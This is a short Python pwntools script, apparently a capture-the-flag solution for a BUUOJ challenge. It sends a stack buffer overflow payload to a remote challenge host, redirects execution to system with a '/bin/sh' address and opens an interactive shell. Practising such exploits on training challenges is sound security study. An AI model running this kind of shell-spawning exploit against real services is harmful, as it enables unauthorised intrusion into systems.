from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29788)
elf = ELF('./pwn')

binsh_addr = 0x804a024

io.sendlineafter(b'Input:', cyclic(0x88) + p32(elf.symbols['main']) + p32(elf.plt['system']) + p32(binsh_addr) + p32(binsh_addr))

io.interactive()